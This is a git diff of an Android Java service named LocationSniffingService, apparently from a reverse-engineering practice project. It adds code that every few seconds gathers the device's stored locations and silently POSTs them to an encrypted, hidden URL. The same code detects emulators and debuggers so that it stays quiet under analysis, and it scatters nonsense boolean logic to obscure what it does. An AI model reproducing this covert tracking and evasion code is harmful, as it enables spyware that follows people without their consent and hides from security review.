@@ -1,77 +1,73 @@
 package com.woop.tryreverseengineerthis.service;
-
 import android.annotation.TargetApi;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.location.Location;
-import android.location.LocationManager;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
 import android.os.Build;
 import android.os.Debug;
-import android.os.Handler;
+import android.os.Environment;
 import android.os.IBinder;
-import android.support.annotation.Nullable;
-import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import com.woop.tryreverseengineerthis.helper.PictureObfuscate;
+import com.woop.tryreverseengineerthis.helper.StringHelper;
 import com.woop.tryreverseengineerthis.storage.LocationStorage;
-
-import org.json.JSONException;
-import org.json.JSONObject;
-import org.apache.http.*;
-
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.security.InvalidKeyException;
 import java.util.List;
-
-import static android.location.LocationManager.*;
-import static android.os.Build.FINGERPRINT;
-import static android.os.Build.HARDWARE;
-import static android.os.Build.MODEL;
-import static android.os.Build.PRODUCT;
+import java.util.Timer;
+import java.util.TimerTask;
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
 
 /**
+ * Every x seconds, send all the location collected with a POST call to a URL
+ *
  * Created by Jay on 3/29/2016.
  */
 public class LocationSniffingService extends Service{
 
-    private final static String fingerprintStart = "generic";
     private final static String TAG = "LocationSniffingService";
-    @Nullable
+
+    private static Timer mTimer = null;
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
 
+    //Starts the handler which will post every delay seconds
     @Override
     public void onCreate(){
+        Log.d(TAG, "onCreate()");
+        Log.d(TAG, "Starting handler");
+        Log.d(TAG, "Is it coming here");
+        mTimer = new Timer();
+        int delay = 5000;
 
-        Handler handler = new Handler();
-        int delay = 300000;
-
-        handler.postDelayed(new Runnable() {
+        mTimer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
-                if(thisDoesnotDoAnything())
+                if (thisDoesnotDoAnything())
                     return;
                 else
                     thisAlsoDoesnotDoAnything();
             }
-        }, delay);
+        }, 0,delay);
+
     }
 
     private void thisAlsoDoesnotDoAnything(){
 
     }
 
+    //Concats all the locations to send
     private boolean sendQuietly() {
-
         List<Location> locations = LocationStorage.getAllLocation();
         StringBuilder builder = new StringBuilder();
         for(Location loc : locations){
@@ -85,119 +81,190 @@ public class LocationSniffingService extends Service{
             builder.append(",");
             builder.append("||");
         }
+        actualSend(builder.toString());
 
-        sendForReals(builder.toString());
-
+        //Logic Obfuscation
         return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
     }
-
     @TargetApi(Build.VERSION_CODES.KITKAT)
-    private void sendForReals(String s) {
+    private void actualSend(String s) {
         try {
-            URL url = new URL("toBeChanged");
+            String urlString = "d102jd012jasd";
+            String http = "uas0j1d12dasDas";
+            String requestProperty1 = "aspdk2DasdmaSDa==";
+            String requestProperty2 = "as=a=sdnasd2d22d2";
+            String requestProperty3 = "ask20asdj20jd9";
+            String requestProperty4 = "asdSDs22d@d222==";
+            String requestProperty5 = "20k20dk20ASD/**/2d==";
+
+            try{
+                urlString = StringHelper.getStringStatic(urlString);
+                http = StringHelper.getStringStatic(http);
+                requestProperty1 = StringHelper.getStringStatic(requestProperty1);
+                requestProperty2 = StringHelper.getStringStatic(requestProperty2);
+                requestProperty3 = StringHelper.getStringStatic(requestProperty3);
+                requestProperty4 = StringHelper.getStringStatic(requestProperty4);
+                requestProperty5 = StringHelper.getStringStatic(requestProperty5);
+            } catch (IllegalBlockSizeException e) {
+                e.printStackTrace();
+                return;
+            } catch (BadPaddingException e) {
+                e.printStackTrace();
+                return;
+            } catch (InvalidKeyException e) {
+                e.printStackTrace();
+                return;
+            } catch (Exception e){
+                e.printStackTrace();
+                return;
+            }
+
+            URL url = new URL(urlString);
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setDoOutput(true);
             connection.setInstanceFollowRedirects(false);
-            connection.setRequestMethod("POST");
-            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            connection.setRequestProperty("charset", "utf-8");
-            connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
+            connection.setRequestMethod(http);
+            connection.setRequestProperty(requestProperty1, requestProperty2);
+            connection.setRequestProperty(requestProperty3, requestProperty4);
+            connection.setRequestProperty(requestProperty5, Integer.toString(postData.length));
             connection.setUseCaches(false);
             try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
                 wr.write(postData);
             }
         } catch (MalformedURLException e) {
-            e.printStackTrace();
             return;
         } catch (IOException e) {
-            e.printStackTrace();
+            return;
+        } catch (Exception e) {
             return;
         }
         Log.d(TAG, "Sent");
     }
 
+
     private boolean thisDoesnotDoAnything(){
 
+        Log.d(TAG,"Checking...");
         boolean b = false;
-
         if (isValid())
             b = sendQuietly();
+        Log.d(TAG, isValid() + "");
 
-        return (b^=b) ? (b == b)^(b == (b^=b^=b^=b)) : (b^b^b^b);
+        return (b^=b) ? (b == b)^(b) : (b^b^b^b);
     }
 
+    //Check if the environment is an emulated environment - just in case it is being analysed
     private boolean isValid(){
+
+        Log.d(TAG, "Check if valid");
+
+        @PictureObfuscate
+        String generic = "OnceUponATime";
+        @PictureObfuscate
+        String unknown = "LivedABunnyCalled";
+        @PictureObfuscate
+        String googlesdk = "Judy.SheWasGoingTo";
+        @PictureObfuscate
+        String emulator = "OoposN10earlyforGot";
+        @PictureObfuscate
+        String androidsdk86 = "beTheBestCopIn";
+        @PictureObfuscate
+        String genymotion = "Zo0o0o0o0Topia";
+        @PictureObfuscate
+        String sdk = "SheDidNotRealise";
+        @PictureObfuscate
+        String sdk86 = "however,ThatShe";
+        @PictureObfuscate
+        String vbox = "wasJustGoingtobe";
+        @PictureObfuscate
+        String goldfish = "amereparkingWarden";
+        @PictureObfuscate
+        String android = "sadfacebunny";
+
+        String fingerprint = "T05FMTExMTExMTExMQ==";
+        String model = "VFdPMjIyMjIyMjIyMg==";
+        String manufacturer = "VEhSRUUzMzMzMzMzMw==";
+        String product = "Rk9VUjQ0NDQ0NDQ0NA==";
+        String hardware = "RklWRTU1NTU1NTU1NQ==";
+        String telephonyservice = "U0lYNjY2NjY2NjY2Ng==";
+        String connectivityservice = "U0lYNjY2NjY2NjY2Ng==";
+        String locationservice = "RUlHSFQ4ODg4ODg4OA==";
+        String gpsprovider = "TklORTk5OTk5OTk5OQ==";
+        String networkprovider = "VEVOMDAwMDAwMDAwMA==";
+        String telephoneoperator = "RUxWRU4xMTExMTExMQ==";
+
+        try{
+            generic = StringHelper.getStringStatic(generic);
+            unknown = StringHelper.getStringStatic(unknown);
+            googlesdk = StringHelper.getStringStatic(googlesdk);
+            emulator = StringHelper.getStringStatic(emulator);
+            androidsdk86 = StringHelper.getStringStatic(androidsdk86);
+            genymotion = StringHelper.getStringStatic(genymotion);
+            sdk = StringHelper.getStringStatic(sdk);
+            sdk86 = StringHelper.getStringStatic(sdk86);
+            vbox = StringHelper.getStringStatic(vbox);
+            goldfish = StringHelper.getStringStatic(goldfish);
+            android = StringHelper.getStringStatic(android);
+
+            fingerprint = StringHelper.getStringDynamic(fingerprint);
+            model = StringHelper.getStringDynamic(model);
+            manufacturer = StringHelper.getStringDynamic(manufacturer);
+            product = StringHelper.getStringDynamic(product);
+            hardware = StringHelper.getStringDynamic(hardware);
+            telephonyservice = StringHelper.getStringDynamic(telephonyservice);
+            connectivityservice = StringHelper.getStringDynamic(connectivityservice);
+            locationservice = StringHelper.getStringDynamic(locationservice);
+            gpsprovider = StringHelper.getStringDynamic(gpsprovider);
+            networkprovider = StringHelper.getStringDynamic(networkprovider);
+            telephoneoperator = StringHelper.getStringDynamic(telephoneoperator);
+        } catch (IllegalBlockSizeException e) {
+            e.printStackTrace();
+            return false;
+        } catch (BadPaddingException e) {
+            e.printStackTrace();
+            return false;
+        } catch (InvalidKeyException e) {
+            e.printStackTrace();
+            return false;
+        } catch (Exception e){
+            e.printStackTrace();
+            return false;
+        }
+
         //Check build's fingerprint
-        Boolean checkFingerprint =  FINGERPRINT.startsWith("generic") ||
-                FINGERPRINT.startsWith("unknown");
+        Boolean checkFingerprint =  fingerprint.startsWith(generic) ||
+                fingerprint.startsWith(unknown);
 
         //Check build's model
-        Boolean checkModel =        MODEL.contains("google_sdk") ||
-                MODEL.contains("Emulator") ||
-                MODEL.contains("Android SDK built for x86");
+        Boolean checkModel =        model.contains(googlesdk) ||
+                model.contains(emulator) ||
+                model.contains(androidsdk86);
 
         //Check Manurfacturer for Genymotion (an emulation software)
-        Boolean checkManufacturer = Build.MANUFACTURER.contains("Genymotion") ||
-                Build.MANUFACTURER.contains("unknown");
+        Boolean checkManufacturer = manufacturer.contains(genymotion) ||
+                manufacturer.contains(unknown);
 
         //Check build's product
-        Boolean checkProduct = "google_sdk".equals(PRODUCT) ||
-                "sdk".equals(PRODUCT) ||
-                "sdk_x86".equals(PRODUCT) ||
-                "vbox86p".equals(PRODUCT) ||
-                PRODUCT.matches(".*_?sdk_?.*");
+        Boolean checkProduct = product.contains(sdk) ||
+                product.contains(vbox);
 
         //Check for goldfish hardware
-        Boolean checkHardware = (HARDWARE).contains("goldfish") ||
-                (HARDWARE).contains("vbox86");
+        Boolean checkHardware = hardware.contains(goldfish) ||
+                hardware.contains(vbox);
 
         //Return if any is detected
         if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
             return false;
 
         //Check for telephone operator
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        String operator = telephonyManager.getNetworkOperator();
-
         //Return if it is android
-        if("Android".equals(operator))
+        if(android.equals(telephoneoperator))
             return false;
 
         //Return if debugger is connected
         if(Debug.isDebuggerConnected())
             return false;
-
-        ConnectivityManager connectivityManager = (ConnectivityManager)
-                getSystemService(CONNECTIVITY_SERVICE);
-
-        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
-
-        //Return if internet is not connected
-        if(networkInfo == null || !(networkInfo.isConnected()))
-            return false;
-
-
-        LocationManager locationManager = (LocationManager)
-                getSystemService(LOCATION_SERVICE);
-
-        boolean gps_enabled = false;
-        boolean network_enabled = false;
-
-        if(locationManager==null)
-            locationManager = (LocationManager) this.getSystemService(LOCATION_SERVICE);
-        try{
-            gps_enabled = locationManager.isProviderEnabled(GPS_PROVIDER);
-        }catch(Exception ex){}
-        try{
-            network_enabled = locationManager.isProviderEnabled(NETWORK_PROVIDER);
-        }catch(Exception ex){}
-
-        //If location service is not enabled don't bother
-        if(!gps_enabled && !network_enabled)
-            return false;
-
-        
 
         return true;
     }
